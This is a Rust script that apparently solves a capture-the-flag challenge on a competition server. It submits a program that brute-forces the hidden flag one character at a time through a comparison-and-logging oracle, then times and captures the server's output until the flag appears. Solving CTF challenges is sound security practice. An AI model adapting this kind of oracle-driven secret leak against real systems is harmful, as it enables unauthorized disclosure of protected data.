// Full-session capture: stage 4 -> code -> EOF, then drain the (teletype-animated)
// result frame to completion. Timestamps every chunk so we learn the real cadence.
// Stops when the flag/result is fully in, the menu returns, the socket closes, or CAP.
//
//   rustc -O capture.rs -o capture && ./capture <preset>
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant};

const HOST: &str = "challs.nusgreyhats.org";
const PORT: u16 = 36167;
const CAP: Duration = Duration::from_secs(32); // total post-EOF drain budget

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    needle.len() <= hay.len() && hay.windows(needle.len()).any(|w| w == needle)
}

fn read_until(s: &mut TcpStream, needle: &[u8], cap: Duration) {
    let mut tmp = [0u8; 8192];
    let mut buf = Vec::new();
    let start = Instant::now();
    loop {
        if start.elapsed() >= cap { break; }
        match s.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => { buf.extend_from_slice(&tmp[..n]); if contains(&buf, needle) { break; } }
            Err(e) => match e.kind() {
                std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => continue,
                _ => break,
            },
        }
    }
}

fn prog_for(preset: &str) -> String {
    match preset {
        "none" => "\"AAAA\"".into(),
        "g" => "send(analysisService,(\"compare\",self(),0,\"g\"));receive[hn(\"comparison\",s)=>(send(logService,(\"log\",self(),s));receive[hn(\"logged\",b)=>if b then \"g\" else \"?\"])]".into(),
        "flag" => "let val cs=\"grey{}_etaoinshrdlcumwfgypbvkxjqz0123456789-!?.+=*ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\
             fun a j=substring(cs,j,j+1)\n\
             fun p i d=(send(analysisService,(\"compare\",self(),i,d));receive[hn(\"comparison\",s)=>(send(logService,(\"log\",self(),s));receive[hn(\"logged\",b)=>b])])\n\
             fun sc i j=if a j=\"\" then \"?\" else if p i(a j)then a j else sc i(j+1)\n\
             val _=send(analysisService,(\"analyze\",self()))\n\
             val n=receive[hn(\"analysis\",L)=>L]\n\
             fun bd i=if i>=n then \"\" else (sc i 0)^bd(i+1)\n\
             in bd 0 end".into(),
        _ => "\"AAAA\"".into(),
    }
}

fn main() {
    let preset = std::env::args().nth(1).unwrap_or_else(|| "none".into());
    let prog = prog_for(&preset);
    let addr = (HOST, PORT).to_socket_addrs().unwrap().next().unwrap();
    let mut s = TcpStream::connect_timeout(&addr, Duration::from_secs(6)).expect("connect");
    s.set_read_timeout(Some(Duration::from_millis(200))).unwrap();

    read_until(&mut s, b">>", Duration::from_secs(5));
    s.write_all(b"4\n").unwrap(); s.flush().unwrap();
    read_until(&mut s, b">>", Duration::from_secs(5));
    s.write_all(prog.as_bytes()).unwrap(); s.write_all(b"\nEOF\n").unwrap(); s.flush().unwrap();

    eprintln!("[capture] preset={preset} EOF sent, draining up to {}s...", CAP.as_secs());
    let t_eof = Instant::now();
    let mut tmp = [0u8; 8192];
    let mut all = Vec::new();
    let mut chunks = 0u32;
    loop {
        if t_eof.elapsed() >= CAP { eprintln!("[capture] CAP reached"); break; }
        match s.read(&mut tmp) {
            Ok(0) => { eprintln!("[capture] server closed @ {:.2}s", t_eof.elapsed().as_secs_f32()); break; }
            Ok(n) => {
                all.extend_from_slice(&tmp[..n]);
                chunks += 1;
                let txt = String::from_utf8_lossy(&tmp[..n]);
                let preview: String = txt.chars().filter(|c| !c.is_control() || *c=='\n').collect();
                let preview = preview.replace('\n', "\\n");
                let p: String = preview.chars().take(70).collect();
                eprintln!("  +{:6.2}s  {:5}B  {}", t_eof.elapsed().as_secs_f32(), n, p);
                // Do NOT stop at the menu redraw -- keep draining the full CAP so we can
                // see whether ANYTHING (a late flag) arrives in the 10-32s window AFTER
                // the [TIMEOUT] frame. Only a complete real flag ends the capture early.
                if contains(&all, b"grey{") && all.windows(5).position(|w| w==b"grey{")
                    .map_or(false, |p| all[p..].contains(&b'}')) {
                    eprintln!("[capture] *** real flag closed @ {:.2}s ***", t_eof.elapsed().as_secs_f32());
                    break;
                }
            }
            Err(e) => match e.kind() {
                std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => continue,
                _ => { eprintln!("[capture] read err {e}"); break; }
            },
        }
    }
    let txt = String::from_utf8_lossy(&all);
    let raw_path = format!("cap_{preset}.raw");
    let _ = std::fs::write(&raw_path, &all);
    eprintln!("\n[capture] total {} bytes in {} chunks over {:.2}s  (raw -> {})", all.len(), chunks, t_eof.elapsed().as_secs_f32(), raw_path);
    eprintln!("[capture] has Message:={} abnormally={} grey{{={}",
        txt.contains("Message:"), txt.contains("abnormally"), txt.contains("grey{"));
    // print any line mentioning Message or grey
    for ln in txt.lines() {
        if ln.contains("Message:") || ln.contains("grey{") {
            println!("RESULTLINE: {}", ln.replace('\u{2551}', "").trim());
        }
    }
}
